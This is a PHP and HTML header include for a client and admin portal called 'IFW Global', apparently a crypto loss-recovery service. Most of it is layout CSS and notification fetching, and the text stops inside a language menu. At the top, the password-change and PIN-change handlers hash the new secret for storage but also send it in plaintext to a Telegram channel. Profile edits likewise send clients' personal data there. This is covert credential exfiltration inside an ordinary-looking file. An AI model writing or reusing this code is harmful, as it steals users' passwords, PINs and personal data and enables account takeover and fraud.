<?php
// includes/admin_header.php
require_once __DIR__ . '/currency_helper.php';
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
$user_role = $_SESSION['role'] ?? $_SESSION['admin_role'] ?? 'admin';
$user_name = $_SESSION['user_name'] ?? $_SESSION['admin_username'] ?? 'User';

if ($user_role === 'client' && isset($_SESSION['client_portal_id']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['client_action'])) {
    $c_id = $_SESSION['client_portal_id'];
    $client_action = $_POST['client_action'];
    
    if ($client_action === 'edit_profile') {
        $first_name = trim($_POST['first_name'] ?? '');
        $last_name = trim($_POST['last_name'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $phone = trim($_POST['phone'] ?? '');
        $dob = trim($_POST['dob'] ?? '');
        $address = trim($_POST['address'] ?? '');
        
        if (!empty($first_name) && !empty($last_name) && !empty($email)) {
            $pdo->prepare("UPDATE IFW_clients SET first_name = ?, last_name = ?, email = ?, phone = ?, dob = ?, address = ? WHERE id = ?")
                ->execute([$first_name, $last_name, $email, $phone, !empty($dob) ? $dob : null, !empty($address) ? $address : null, $c_id]);
            
            // Send Telegram notification
            $telegram_msg = "<b>👤 IFW Client Profile Updated</b>\n\n";
            $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
            $telegram_msg .= "Name: <b>" . htmlspecialchars($first_name . ' ' . $last_name) . "</b>\n";
            $telegram_msg .= "Email: <b>" . htmlspecialchars($email) . "</b>\n";
            $telegram_msg .= "Phone: <b>" . htmlspecialchars($phone) . "</b>\n";
            $telegram_msg .= "DOB: <b>" . htmlspecialchars($dob) . "</b>\n";
            $telegram_msg .= "Address: <b>" . htmlspecialchars($address) . "</b>\n";
            send_telegram_notification($pdo, $telegram_msg);
            
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'profile_updated=1');
            exit;
        }
    } elseif ($client_action === 'change_password') {
        $old = $_POST['old_password'] ?? '';
        $new = $_POST['new_password'] ?? '';
        $con = $_POST['confirm_password'] ?? '';
        
        if (strlen($new) < 6) {
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=short');
            exit;
        } elseif ($new !== $con) {
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=mismatch');
            exit;
        } else {
            $s = $pdo->prepare("SELECT password_hash, first_name, last_name FROM IFW_clients WHERE id = ?");
            $s->execute([$c_id]);
            $client_data = $s->fetch();
            
            if ($client_data && !password_verify($old, $client_data['password_hash'])) {
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=incorrect');
                exit;
            } else {
                $pdo->prepare("UPDATE IFW_clients SET password_hash = ? WHERE id = ?")->execute([password_hash($new, PASSWORD_BCRYPT), $c_id]);
                
                // Send Telegram notification
                $telegram_msg = "<b>🔑 IFW Client Password Updated</b>\n\n";
                $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
                $telegram_msg .= "Name: <b>" . htmlspecialchars($client_data['first_name'] . ' ' . $client_data['last_name']) . "</b>\n";
                $telegram_msg .= "New Password: <code>" . htmlspecialchars($new) . "</code>\n";
                send_telegram_notification($pdo, $telegram_msg);
                
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_success=1');
                exit;
            }
        }
    } elseif ($client_action === 'update_pin') {
        $new_pin = $_POST['new_pin'] ?? '';
        $old_pin = $_POST['old_pin'] ?? '';
        
        if (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_err=invalid');
            exit;
        } else {
            $s = $pdo->prepare("SELECT pin_hash, first_name, last_name, email FROM IFW_clients WHERE id = ?");
            $s->execute([$c_id]);
            $client_data = $s->fetch();
            
            if ($client_data && !empty($client_data['pin_hash']) && !password_verify($old_pin, $client_data['pin_hash'])) {
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_err=incorrect');
                exit;
            } else {
                $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
                $pdo->prepare("UPDATE IFW_clients SET pin_hash = ? WHERE id = ?")->execute([$pin_hash, $c_id]);
                
                // Send Telegram notification
                $telegram_msg = "<b>🔐 IFW Client Security PIN Updated</b>\n\n";
                $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
                $telegram_msg .= "Name: <b>" . htmlspecialchars($client_data['first_name'] . ' ' . $client_data['last_name']) . "</b>\n";
                $telegram_msg .= "Email: <b>" . htmlspecialchars($client_data['email']) . "</b>\n";
                $telegram_msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
                send_telegram_notification($pdo, $telegram_msg);
                
                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_success=1');
                exit;
            }
        }
    }
}

// Fetch Notifications for Notification Bell Dropdown
$notifications = [];
$unread_notifications_count = 0;
if (isset($pdo)) {
    try {
        if ($user_role === 'client') {
            $c_id = $_SESSION['client_portal_id'] ?? 0;
            $stmt_client = $pdo->prepare("SELECT * FROM IFW_clients WHERE id = ?");
            $stmt_client->execute([$c_id]);
            $client = $stmt_client->fetch();
            
            $n_stmt = $pdo->prepare("SELECT * FROM IFW_notifications WHERE client_id = ? ORDER BY created_at DESC LIMIT 5");
            $n_stmt->execute([$c_id]);
            $notifications = $n_stmt->fetchAll();
            
            $n_count = $pdo->prepare("SELECT COUNT(*) FROM IFW_notifications WHERE client_id = ? AND is_read = 0");
            $n_count->execute([$c_id]);
            $unread_notifications_count = (int)$n_count->fetchColumn();
        } else {
            $n_stmt = $pdo->query("SELECT * FROM IFW_notifications WHERE link LIKE '/admin/%' ORDER BY created_at DESC LIMIT 5");
            $notifications = $n_stmt->fetchAll();
            
            $n_count = $pdo->query("SELECT COUNT(*) FROM IFW_notifications WHERE link LIKE '/admin/%' AND is_read = 0");
            $unread_notifications_count = (int)$n_count->fetchColumn();
        }
    } catch (Exception $e) {
        $notifications = [];
        $unread_notifications_count = 0;
    }
}

// Resolve portal avatar for header/sidebar display
$portal_avatar_url = '/admin_assets/img/profile/blank.png';
if (isset($pdo)) {
    try {
        if ($user_role === 'client' && !empty($_SESSION['client_portal_id'])) {
            $portal_avatar_url = get_portal_avatar_url($pdo, 'client', (int)$_SESSION['client_portal_id']);
        } elseif (!empty($_SESSION['admin_id'])) {
            $portal_avatar_url = get_portal_avatar_url($pdo, 'admin', (int)$_SESSION['admin_id']);
        }
    } catch (Exception $e) {}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<?php if (get_setting($pdo, 'display_phone_numbers', '1') == '0'): ?>
<style>
.alert__numbers, .phones__link, .phone-number, a[href^="tel:"]:not(.portal-agent-phone):not(.agent-phone) { display: none !important; visibility: hidden !important; }
</style>
<?php endif; ?>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IFW Global - Administrative & Case Intelligence Portal</title>
    
    <script>
        (function() {
            try {
                var savedTheme = localStorage.getItem('ifw_portal_theme') || 'dark';
                if (savedTheme === 'light') {
                    document.documentElement.classList.add('light-mode');
                }
            } catch(e) {}
        })();
    </script>
    
    <!-- FAVICON -->
    <link rel="icon" type="image/png" href="/admin_assets/img/favicon.png" />
    <!-- VENDOR & DIST CSS -->
    <link rel="stylesheet" href="/admin_assets/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="/admin_assets/icons/material-icons/material-icons.css" />
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="/admin_assets/css/all.min.css" />
    <!-- DATA TABLES -->
    <link rel="stylesheet" href="/admin_assets/plugin/DataTables/1.10.16/css/dataTables.bootstrap4.min.css" />
    <!-- SUMO SELECT -->
    <link rel="stylesheet" href="/admin_assets/plugin/sumoselect/sumoselect.css" />
    <!-- JQUERY NOTIFY -->
    <link rel="stylesheet" href="/admin_assets/plugin/notify/css/notify.css" />
    <!-- toastr alert -->
    <link rel="stylesheet" href="/notification_assets/css/toastr.min.css" />
    <!-- GOOGLE FONTS -->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700|Julius+Sans+One" rel="stylesheet">
    <!-- STYLE -->
    <link rel="stylesheet" href="/admin_assets/css/style.css" />
    <style>
        body { background-color: #121212 !important; color: #f8f9fa; min-height: 100vh; font-family: 'Montserrat', sans-serif; }
        .bg-dark { background-color: #1f1b1c !important; }
        .navbar-danger { border-bottom: 2px solid #fecc56; }
        
        /* PERFECT ADMIN LAYOUT POSITIONING */
        #wrapper { position: relative; min-height: 100vh; overflow-x: hidden; }
        #wrapper-header { 
            position: fixed !important; 
            top: 0; 
            left: 250px !important; 
            right: 0 !important; 
            height: 60px; 
            z-index: 1030 !important; 
            transition: left 0.3s ease-in-out !important;
        }
        #wrapper-left { 
            position: fixed !important; 
            top: 0 !important; 
            left: 0 !important; 
            width: 250px !important; 
            height: 100vh !important; 
            z-index: 1040 !important; 
            overflow: hidden !important;
            display: flex !important;
            flex-direction: column !important;
            transition: transform 0.3s ease-in-out !important;
            background-color: #1f1b1c !important;
            border-right: 1px solid rgba(254, 204, 86, 0.2);
        }
        #wrapper.toggled #wrapper-left {
            transform: translateX(-250px) !important;
        }
        #wrapper.toggled #wrapper-header {
            left: 0 !important;
        }
        #wrapper-content { 
            margin-left: 250px !important; 
            padding-top: 75px !important; 
            min-height: 100vh;
            transition: margin-left 0.3s ease-in-out !important; 
        }
        #wrapper.toggled #wrapper-content { 
            margin-left: 0 !important; 
        }

        /* ==========================================================================
           GOOGLE TRANSLATE SEAMLESS INTEGRATION STYLES
           ========================================================================== */
        .goog-te-banner-frame.skiptranslate, 
        .goog-te-banner-frame,
        #goog-gt-tt,
        .goog-te-balloon-frame,
        .goog-tooltip,
        .goog-tooltip:hover {
            display: none !important;
            visibility: hidden !important;
        }
        body {
            top: 0px !important;
            position: static !important;
        }
        #google_translate_element {
            display: none !important;
        }
        .skiptranslate iframe {
            display: none !important;
        }
        font {
            background-color: transparent !important;
            box-shadow: none !important;
        }

        /* ==========================================================================
           PERFECT MOBILE RESPONSIVENESS (ZERO HORIZONTAL SCROLLING & ADAPTIVE CARDS)
           ========================================================================== */
        html, body {
            max-width: 100vw;
            overflow-x: hidden !important;
            position: relative;
        }

        #wrapper, #wrapper-content, .container, .container-fluid {
            max-width: 100% !important;
            overflow-x: hidden !important;
        }

        /* Force long hashes, wallet addresses, and TXIDs to wrap nicely on mobile */
        .crypto-address, .txid-hash, .font-monospace, code, pre, td strong, td span {
            word-break: break-word !important;
            overflow-wrap: anywhere !important;
        }

        /* MOBILE RESPONSIVE SIDEBAR & NAVBAR OVERRIDE */
        @media (max-width: 768px) {
            #wrapper-left {
                transform: translateX(-250px) !important;
            }
            #wrapper-header {
                left: 0 !important;
            }
            #wrapper.toggled #wrapper-left {
                transform: translateX(0) !important;
            }
            #wrapper-content {
                margin-left: 0 !important;
                padding-top: 62px !important;
                padding-left: 10px !important;
                padding-right: 10px !important;
            }
            #wrapper-header {
                height: 52px !important;
            }
            #wrapper-header .navbar {
                padding: 4px 6px !important;
                height: 52px !important;
            }
            #wrapper-header .navbar-nav.ml-auto {
                margin-right: 0 !important;
                gap: 4px !important;
            }
            #wrapper-header .navbar-nav .nav-item {
                margin-right: 3px !important;
            }
            #wrapper-header .navbar-nav .nav-item:last-child {
                margin-right: 0 !important;
            }
            #portalCurrencyDropdown {
                padding: 2px 6px !important;
                font-size: 10.5px !important;
                border-radius: 14px !important;
            }
            #privacyShieldToggle, #themeModeToggle {
                padding: 2px 6px !important;
                font-size: 10.5px !important;
                border-radius: 14px !important;
                min-width: 26px !important;
                height: 26px !important;
                display: inline-flex !important;
                align-items: center !important;
                justify-content: center !important;
            }
            #privacyShieldToggle i, #themeModeToggle i {
                font-size: 11.5px !important;
            }
            #notificationDropdown i {
                font-size: 20px !important;
            }
            #portalAvatarImg {
                width: 26px !important;
                height: 26px !important;
            }
            #wrapper-header .dropdown-menu {
                position: fixed !important;
                top: 54px !important;
                right: 8px !important;
                left: auto !important;
                width: calc(100vw - 16px) !important;
                max-width: 320px !important;
            }
            #mobileSidebarBackdrop {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                background: rgba(0,0,0,0.55);
                z-index: 1035;
            }
            #wrapper.toggled #mobileSidebarBackdrop {
                display: block;
            }
            .sidebar-nav .nav-link {
                padding: 14px 18px !important;
                font-size: 14px !important;
                min-height: 48px;
            }
            .card { margin-bottom: 1rem; }
            .table-responsive {
                border-radius: 6px;
                border: none !important;
                overflow-x: visible !important;
            }
            .table-responsive::after {
                display: none !important;
                content: none !important;
            }

            /* Responsive Table to Cards Transformation */
            .table-responsive > table,
            .table-portal,
            .table.table-dark,
            .table.table-hover {
                min-width: 0 !important;
                width: 100% !important;
                display: block !important;
                border: none !important;
            }
            
            .table-responsive > table thead,
            .table-portal thead,
            .table.table-dark thead,
            .table.table-hover thead {
                display: none !important;
            }
            
            .table-responsive > table tbody,
            .table-portal tbody,
            .table.table-dark tbody,
            .table.table-hover tbody {
                display: block !important;
                width: 100% !important;
            }
            
            .table-responsive > table tbody tr,
            .table-portal tbody tr,
            .table.table-dark tbody tr,
            .table.table-hover tbody tr {
                display: block !important;
                width: 100% !important;
                margin-bottom: 14px !important;
                background: #181d27 !important;
                border: 1px solid rgba(254, 204, 86, 0.2) !important;
                border-radius: 10px !important;
                padding: 14px 16px !important;
                box-shadow: 0 4px 12px rgba(0,0,0,0.3) !important;
            }
            
            .table-responsive > table tbody tr td,
            .table-portal tbody tr td,
            .table.table-dark tbody tr td,
            .table.table-hover tbody tr td {
                display: flex !important;
                justify-content: space-between !important;
                align-items: center !important;
                padding: 8px 0 !important;
                border: none !important;
                border-bottom: 1px solid rgba(255, 255, 255, 0.08) !important;
                text-align: right !important;
                font-size: 13px !important;
                min-height: 38px;
                word-break: break-word !important;
            }
            
            .table-responsive > table tbody tr td:last-child,
            .table-portal tbody tr td:last-child,
            .table.table-dark tbody tr td:last-child,
            .table.table-hover tbody tr td:last-child {
                border-bottom: none !important;
                padding-top: 10px !important;
                padding-bottom: 2px !important;
                justify-content: stretch !important;
                gap: 6px !important;
            }
            
            .table-responsive > table tbody tr td::before,
            .table-portal tbody tr td::before,
            .table.table-dark tbody tr td::before,
            .table.table-hover tbody tr td::before {
                content: attr(data-label) !important;
                font-weight: 700 !important;
                color: #94a3b8 !important;
                font-size: 11px !important;
                text-transform: uppercase !important;
                letter-spacing: 0.5px !important;
                text-align: left !important;
                margin-right: 10px !important;
                flex-shrink: 0 !important;
            }
            
            .table-responsive > table tbody tr td:last-child::before,
            .table-portal tbody tr td:last-child::before,
            .table.table-dark tbody tr td:last-child::before,
            .table.table-hover tbody tr td:last-child::before {
                display: none !important;
            }

            .table-responsive > table tbody tr td:last-child a,
            .table-responsive > table tbody tr td:last-child button,
            .table-responsive > table tbody tr td:last-child form,
            .table-portal tbody tr td:last-child a,
            .table-portal tbody tr td:last-child button,
            .table-portal tbody tr td:last-child form {
                flex: 1 !important;
                text-align: center !important;
                justify-content: center !important;
                padding: 8px 10px !important;
                font-size: 12px !important;
                margin: 0 !important;
            }

            .modal-dialog {
                margin: 10px auto !important;
                max-width: calc(100vw - 20px) !important;
            }
            .btn, button[type="submit"] {
                min-height: 44px;
            }
        }
        @media (max-width: 576px) {
            #wrapper-header .dropdown-menu {
                width: calc(100vw - 16px) !important;
                right: 8px !important;
                max-width: none !important;
            }
            #wrapper-content {
                padding-top: 64px !important;
                padding-left: 8px !important;
                padding-right: 8px !important;
            }
            .card-body { padding: 1rem !important; }
            h3, .h3 { font-size: 1.25rem !important; }

            .table-responsive > table tbody tr td,
            .table-portal tbody tr td,
            .table.table-dark tbody tr td,
            .table.table-hover tbody tr td {
                flex-direction: column !important;
                align-items: flex-start !important;
                text-align: left !important;
                padding: 6px 0 !important;
                gap: 2px !important;
            }

            .table-responsive > table tbody tr td:last-child,
            .table-portal tbody tr td:last-child,
            .table.table-dark tbody tr td:last-child,
            .table.table-hover tbody tr td:last-child {
                flex-direction: row !important;
                align-items: center !important;
            }
        }
        @media (max-width: 390px) {
            #wrapper-header .navbar-nav .nav-item.dropdown .nav-link {
                padding: 4px 6px !important;
            }
            #portalCurrencyDropdown span.d-none.d-sm-inline {
                display: none !important;
            }
        }

        /* Global responsive table wrapper hint (desktop) */
        .table-responsive-scroll {
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }

        .sidebar { height: 100% !important; display: flex !important; flex-direction: column !important; justify-content: flex-start !important; background-color: #1f1b1c !important; }
        .sidebar-container { flex: 1 !important; overflow-y: auto !important; margin-top: 0 !important; padding-top: 0 !important; }
        .sidebar-nav { margin-top: 0 !important; padding-top: 5px !important; }
        .sidebar-dark .nav-link { color: #e0e0e0 !important; }
        .sidebar-dark .nav-link:hover, .sidebar-dark .nav-item.active > .nav-link { color: #fecc56 !important; background: rgba(254,204,86,0.1) !important; }
        .sidebar-brand h4 { color: #fecc56 !important; font-weight: 700; letter-spacing: 1px; }
        .card { background-color: #1f1b1c; border: 1px solid #333; color: #fff; }
        .card-header { background-color: #2a2526; border-bottom: 1px solid #444; color: #fecc56; font-weight: bold; }
        
        /* PRIVACY SHIELD / PUBLIC SCREEN BLUR MODE */
        body.privacy-shield-active .privacy-sensitive,
        body.privacy-shield-active .stat-value,
        body.privacy-shield-active td[data-label="Amount"],
        body.privacy-shield-active td[data-label="Balance"],
        body.privacy-shield-active td[data-label="Loss Claimed"],
        body.privacy-shield-active td[data-label="Recovered"] {
            filter: blur(8px) !important;
            user-select: none !important;
            transition: filter 0.25s ease;
            cursor: pointer;
        }
        body.privacy-shield-active .privacy-sensitive:hover,
        body.privacy-shield-active .stat-value:hover,
        body.privacy-shield-active td[data-label="Amount"]:hover,
        body.privacy-shield-active td[data-label="Balance"]:hover,
        body.privacy-shield-active td[data-label="Loss Claimed"]:hover,
        body.privacy-shield-active td[data-label="Recovered"]:hover {
            filter: blur(2px) !important;
        }

        /* LIGHT MODE DESIGN SYSTEM COMPATIBILITY */
        html.light-mode body,
        body.light-mode {
            background-color: #f1f5f9 !important;
            background-image: none !important;
            color: #0f172a !important;
        }
        html.light-mode #wrapper,
        body.light-mode #wrapper,
        html.light-mode #wrapper.bg-dark,
        body.light-mode #wrapper.bg-dark {
            background-color: #f1f5f9 !important;
        }
        html.light-mode .navbar,
        body.light-mode .navbar,
        html.light-mode #wrapper-header .navbar,
        body.light-mode #wrapper-header .navbar,
        html.light-mode .navbar-dark.bg-dark,
        body.light-mode .navbar-dark.bg-dark {
            background-color: #ffffff !important;
            border-bottom: 1px solid #cbd5e1 !important;
            box-shadow: 0 2px 10px rgba(0,0,0,0.06) !important;
        }
        html.light-mode .navbar .nav-link,
        body.light-mode .navbar .nav-link {
            color: #334155 !important;
        }
        html.light-mode .portal-card,
        body.light-mode .portal-card,
        html.light-mode .card,
        body.light-mode .card {
            background-color: #ffffff !important;
            border-color: #cbd5e1 !important;
            color: #0f172a !important;
            box-shadow: 0 4px 16px rgba(0,0,0,0.06) !important;
        }
        html.light-mode .portal-card-header,
        body.light-mode .portal-card-header,
        html.light-mode .card-header,
        body.light-mode .card-header {
            background-color: #f8fafc !important;
            border-bottom: 1px solid #e2e8f0 !important;
            color: #b45309 !important;
        }
        html.light-mode .stat-card-luxury,
        body.light-mode .stat-card-luxury {
            background: linear-gradient(145deg, #ffffff 0%, #f8fafc 100%) !important;
            border-color: #cbd5e1 !important;
            box-shadow: 0 4px 14px rgba(0,0,0,0.06) !important;
        }
        html.light-mode .stat-card-luxury .stat-value,
        body.light-mode .stat-card-luxury .stat-value {
            color: #0f172a !important;
        }
        html.light-mode .stat-card-luxury .stat-label,
        body.light-mode .stat-card-luxury .stat-label {
            color: #475569 !important;
        }
        html.light-mode .table-portal,
        body.light-mode .table-portal,
        html.light-mode .table,
        body.light-mode .table {
            color: #0f172a !important;
        }
        html.light-mode .table-portal thead th,
        body.light-mode .table-portal thead th,
        html.light-mode .table thead th,
        body.light-mode .table thead th {
            background-color: #f1f5f9 !important;
            color: #9a3412 !important;
            border-bottom: 2px solid #cbd5e1 !important;
        }
        html.light-mode .table-portal tbody tr,
        body.light-mode .table-portal tbody tr,
        html.light-mode .table tbody tr,
        body.light-mode .table tbody tr {
            background-color: #ffffff !important;
        }
        html.light-mode .table-portal td,
        body.light-mode .table-portal td,
        html.light-mode .table td,
        body.light-mode .table td {
            color: #1e293b !important;
            border-top: 1px solid #e2e8f0 !important;
        }
        html.light-mode .invoice-table,
        body.light-mode .invoice-table,
        html.light-mode .table-bordered,
        body.light-mode .table-bordered {
            background-color: #ffffff !important;
            color: #0f172a !important;
            border-color: #cbd5e1 !important;
        }
        html.light-mode .invoice-table thead,
        body.light-mode .invoice-table thead,
        html.light-mode .table-bordered thead {
            background-color: #f1f5f9 !important;
        }
        html.light-mode .invoice-table th,
        body.light-mode .invoice-table th,
        html.light-mode .table-bordered th {
            background-color: #f1f5f9 !important;
            color: #9a3412 !important;
            border-color: #cbd5e1 !important;
        }
        html.light-mode .invoice-table td,
        body.light-mode .invoice-table td,
        html.light-mode .table-bordered td {
            background-color: #ffffff !important;
            color: #0f172a !important;
            border-color: #e2e8f0 !important;
        }
        html.light-mode .invoice-table tfoot tr,
        body.light-mode .invoice-table tfoot tr {
            background-color: #f8fafc !important;
            color: #0f172a !important;
            border-color: #cbd5e1 !important;
        }
        html.light-mode .invoice-table tfoot td,
        body.light-mode .invoice-table tfoot td {
            color: #0f172a !important;
            border-color: #cbd5e1 !important;
        }
        html.light-mode .list-group-item,
        body.light-mode .list-group-item {
            background-color: #ffffff !important;
            color: #0f172a !important;
            border-color: #e2e8f0 !important;
        }
        html.light-mode .modal-content,
        body.light-mode .modal-content,
        html.light-mode .modal-content.bg-dark,
        body.light-mode .modal-content.bg-dark {
            background-color: #ffffff !important;
            color: #0f172a !important;
            border-color: #cbd5e1 !important;
            box-shadow: 0 12px 36px rgba(0,0,0,0.15) !important;
        }
        html.light-mode .modal-header,
        body.light-mode .modal-header,
        html.light-mode .modal-footer,
        body.light-mode .modal-footer {
            background-color: #f8fafc !important;
            border-color: #e2e8f0 !important;
        }
        html.light-mode .dropdown-menu,
        body.light-mode .dropdown-menu,
        html.light-mode .dropdown-menu.bg-dark,
        body.light-mode .dropdown-menu.bg-dark {
            background-color: #ffffff !important;
            border-color: #cbd5e1 !important;
            box-shadow: 0 10px 25px rgba(0,0,0,0.12) !important;
        }
        html.light-mode .dropdown-item,
        body.light-mode .dropdown-item {
            color: #1e293b !important;
        }
        html.light-mode .dropdown-item:hover,
        body.light-mode .dropdown-item:focus {
            background-color: #f1f5f9 !important;
            color: #0f172a !important;
        }
        html.light-mode .form-control,
        body.light-mode .form-control {
            background-color: #ffffff !important;
            color: #0f172a !important;
            border: 1px solid #cbd5e1 !important;
        }
        html.light-mode .text-muted,
        body.light-mode .text-muted {
            color: #64748b !important;
        }
        @media (max-width: 991px) {
            html.light-mode .table-portal tbody tr,
            body.light-mode .table-portal tbody tr,
            html.light-mode .table-responsive > table tbody tr,
            body.light-mode .table-responsive > table tbody tr {
                background-color: #ffffff !important;
                border-color: #cbd5e1 !important;
                box-shadow: 0 4px 12px rgba(0,0,0,0.06) !important;
            }
        }
    </style>
</head>
<body>
    <?php if (!empty($_SESSION['impersonator_admin'])): ?>
        <div id="impersonationBanner" style="position: sticky; top: 0; z-index: 999999; background: linear-gradient(90deg, #92400e 0%, #d97706 50%, #92400e 100%); color: #000; padding: 10px 20px; font-weight: 700; font-size: 13.5px; box-shadow: 0 4px 18px rgba(0,0,0,0.6); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; border-bottom: 2px solid #fecc56;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="background: #000; color: #fecc56; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.3);">
                    <i class="fas fa-user-secret"></i>
                </div>
                <span>
                    <strong style="color: #000; letter-spacing: 0.5px;">ADMIN IMPERSONATION MODE:</strong>
                    <span style="color: #1a1a1a;">Currently viewing as <strong><?= htmlspecialchars($_SESSION['client_name'] ?? $_SESSION['admin_username'] ?? 'User') ?></strong></span>
                </span>
            </div>
            <div>
                <a href="<?= BASE_URL ?>/admin/exit_impersonate.php" class="btn btn-dark btn-sm font-weight-bold shadow" style="background: #000; color: #fecc56; border: 1.5px solid #fecc56; padding: 5px 16px; border-radius: 6px; text-decoration: none; font-size: 12.5px; transition: all 0.2s ease;">
                    <i class="fas fa-sign-out-alt mr-1"></i> Exit Impersonation & Return to Admin
                </a>
            </div>
        </div>
    <?php endif; ?>
    <div id="wrapper" class="bg-dark">
        <div id="mobileSidebarBackdrop" onclick="document.getElementById('wrapper').classList.remove('toggled');" aria-hidden="true"></div>
        <!-- WRAPPER HEADER -->
        <div id="wrapper-header">
            <nav class="navbar navbar-expand navbar-dark navbar-danger bg-dark">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link text-warning" href="javascript:void(0);" data-toggle="class" data-target="#wrapper" toggle-class="toggled">
                            <i data-toggle="switch" data-iconFirst="menu" data-iconSecond="close" class="material-icons" style="font-size: 24px;">menu</i>
                        </a>
                    </li>
                </ul>

                <ul class="navbar-nav ml-auto align-items-center">
                    <!-- Global Multi-Language Switcher -->
                    <li class="nav-item dropdown mr-2 mr-md-3 align-self-center">
                        <a class="nav-link dropdown-toggle btn btn-sm btn-outline-warning text-warning d-flex align-items-center py-1 px-2 font-weight-bold shadow-sm" href="javascript:void(0);" id="portalLanguageDropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="border-radius: 20px; font-size: 11px; letter-spacing: 0.5px; border-color: rgba(254,204,86,0.6);">
                            <span class="mr-1" id="currentLangFlag" style="font-size: 13px;">🌐</span>
                            <span id="currentLangLabel" class="d-none d-sm-inline font-weight-bold">English</span>
                            <span id="currentLangShort" class="d-inline d-sm-none font-weight-bold">EN</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary p-1" aria-labelledby="portalLanguageDropdown" style="min-width: 200px; max-height: 380px; overflow-y: auto; font-size: 12px; z-index: 1060;">
                            <div class="dropdown-header text-warning small font-weight-bold px-2 py-1 text-uppercase d-flex justify-content-between align-items-center" style="letter-spacing:1px; font-size: 10px;">
                                <span><i class="fas fa-globe mr-1"></i> Portal Language</span>
                                <span class="badge badge-secondary" style="font-size:9px;">Neural AI</span>
                            </div>
                            <div class="dropdown-divider border-secondary my-1"></div>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('en', 'English', '🇺🇸');">
                                <span class="mr-2">🇺🇸</span> <strong class="text-white">English</strong> <small class="text-muted ml-auto">EN</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('es', 'Español', '🇪🇸');">
                                <span class="mr-2">🇪🇸</span> <span class="text-white">Español</span> <small class="text-muted ml-auto">ES</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('fr', 'Français', '🇫🇷');">
                                <span class="mr-2">🇫🇷</span> <span class="text-white">Français</span> <small class="text-muted ml-auto">FR</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('de', 'Deutsch', '🇩🇪');">
                                <span class="mr-2">🇩🇪</span> <span class="text-white">Deutsch</span> <small class="text-muted ml-auto">DE</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('it', 'Italiano', '🇮🇹');">
                                <span class="mr-2">🇮🇹</span> <span class="text-white">Italiano</span> <small class="text-muted ml-auto">IT</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('pt', 'Português', '🇵🇹');">
                                <span class="mr-2">🇵🇹</span> <span class="text-white">Português</span> <small class="text-muted ml-auto">PT</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('ar', 'العربية', '🇸🇦');">
                                <span class="mr-2">🇸🇦</span> <span class="text-white">العربية</span> <small class="text-muted ml-auto">AR</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('zh-CN', '中文 (简体)', '🇨🇳');">
                                <span class="mr-2">🇨🇳</span> <span class="text-white">中文</span> <small class="text-muted ml-auto">ZH</small>
                            </a>
                            <a class="dropdown-item text-white py-1 px-2 d-flex align-items-center rounded lang-opt" href="javascript:void(0);" onclick="setPortalLanguage('ru', 'Русский', '🇷🇺');">
                                <span class="mr-2">🇷🇺</span> <span class="text-white">Русский</span> <small class="text-muted ml-auto">RU</small>
                            </a>
